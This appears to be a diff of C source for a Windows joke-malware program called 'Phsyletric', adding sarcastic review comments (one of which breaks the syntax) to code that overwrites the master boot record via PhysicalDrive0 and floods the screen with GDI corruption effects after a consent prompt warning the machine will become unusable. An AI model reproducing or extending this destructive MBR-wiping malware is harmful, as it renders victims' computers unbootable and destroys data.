@@ -8,6 +8,7 @@
 
 void mbr()
 {    
+    // Again SleepMod
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileW(
         L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
@@ -18,7 +19,7 @@ void mbr()
 }
 
 DWORD WINAPI payload1(LPVOID lpParam) {
-    HDC desk = GetDC(0);
+    HDC desk = GetDC(0); // die
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), rx;
     while (1) {
         desk = GetDC(0);
@@ -60,7 +61,7 @@ VOID WINAPI CircleInvert(int x, int y, int w, int h) {
     HWND hwnd = NULL;
     HDC hdc = GetDC(hwnd);
     HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
-    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
+    SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); // i like this
     BitBlt(hdc, x, y, w, h, hdc, x, y, 0x2837E28);
     SelectClipRgn(hdc, hrgn);
     DeleteObject(hrgn);
@@ -68,6 +69,7 @@ VOID WINAPI CircleInvert(int x, int y, int w, int h) {
 }
 
 DWORD WINAPI payload2dot1(LPVOID lpParam) {
+    //H
     RECT rect;
     GetWindowRect(GetDesktopWindow(), &rect);
     int w = rect.right - rect.top - 500, h = rect.bottom - rect.top - 500;
@@ -97,13 +99,14 @@ DWORD WINAPI payload3(LPVOID lpParam) {
 }
 DWORD WINAPI payload4(LPVOID lpParam) {
     HDC hdc = GetDC(0);
+    // Why suddenly using capital INT????
     INT sw = GetSystemMetrics(0);
     INT sh = GetSystemMetrics(1);
-    int radius = 5.0f;
+    int radius = 5.0f; // what the fuck put float value to int
     double moveangle = 0;
     while (true) {
         hdc = GetDC(0);
-        double x = (cos(moveangle) * radius), y = (sin(moveangle) * radius);
+        double x = (cos(moveangle) * radius), y = (sin(moveangle) * radius); //epic gamer move
         SelectObject(hdc, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));
         BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, 0x9273ecef);
         BitBlt(hdc, x, y, sw, sh, hdc, 0, 0, SRCAND);
@@ -112,6 +115,7 @@ DWORD WINAPI payload4(LPVOID lpParam) {
     }
 }
 VOID WINAPI p1() {
+    // Whyred code lmfao
     HDC desk;
     RECT wRect;
     POINT wPt[3];
@@ -135,6 +139,7 @@ VOID WINAPI p1() {
     if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
 }
 VOID WINAPI p2() {
+    //Same as above
     HDC desk;
     RECT wRect;
     POINT wPt[3];
@@ -159,6 +164,7 @@ VOID WINAPI p2() {
 }
 DWORD WINAPI payload5(LPVOID lpParam) {
     while (1) {
+       //Im gonna die
         p1();
         p2();
         p2();
@@ -167,7 +173,7 @@ DWORD WINAPI payload5(LPVOID lpParam) {
 }
 DWORD WINAPI payload6(LPVOID lpParam) {
     HDC desk = GetDC(0);
-    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), radius2 = 500.0f;
+    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), radius2 = 500.0f; // what the fuck float value
     double moveangle = 0;
     while (1) {
         desk = GetDC(0);
@@ -241,7 +247,7 @@ DWORD WINAPI payload9(LPVOID lpParam) {
     while (1) {
         int width, height;
         HWND hwnd;
-
+        //Magnetar
         width = GetSystemMetrics(SM_CXSCREEN);
         height = GetSystemMetrics(SM_CYSCREEN);
         hwnd = GetDesktopWindow();    HDC hdc = GetDC(NULL);
@@ -316,7 +322,7 @@ DWORD WINAPI payload10(LPVOID lpParam) {
 }
 DWORD WINAPI payload11(LPVOID lpParam) {
     HDC desktop = GetDC(NULL);
-    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrM = GetSystemMetrics(SM_CYSCREEN);
+    int ScrW = GetSystemMetrics(SM_CXSCREEN), ScrM = GetSystemMetrics(SM_CYSCREEN); // why using macros
     while (1) {
         desktop = GetDC(NULL);
         if (rand() % 4 == 0) {
@@ -367,7 +373,7 @@ VOID WINAPI zr2() {
     Sleep(2);
 }
 DWORD WINAPI payload12(LPVOID lpParam) {
-    while (1) {
+    while (1) { //die
         zr1();
         zr2();
         zr2();
@@ -403,7 +409,7 @@ DWORD WINAPI payload13dot3(LPVOID lpParam) {
         desk = GetDC(0);
         int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
         for (int t = 0; t < sw + sh; ++t) {
-            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx),
+            int x = (int)(float)(radius + t * tan(t + radius * 3) + rx), /eeeeeeeeeeeeeeee
                 y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
             if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_ERROR)); Sleep(0.99); }
             if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_WARNING)); Sleep(0.99); }
@@ -460,6 +466,7 @@ DWORD WINAPI payload14(LPVOID lpParam) {
     }
 }
 DWORD WINAPI payload15(LPVOID lpParam) {
+    //Nikitpad codes
     int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
     RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     HDC hdc, hdcMem; HBITMAP hbm;
@@ -619,7 +626,7 @@ VOID WINAPI sound10() {
 }
 int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
 {
-
+    //Memz again
     if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
 This malware will harm your computer and makes it unusable.\r\n\
 If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
@@ -639,6 +646,7 @@ STILL EXECUTE IT?", L"Phsyletric", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
         }
         else
         {
+           // I pretty sure there will be memory leaks
             mbr();
             HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
             sound1();
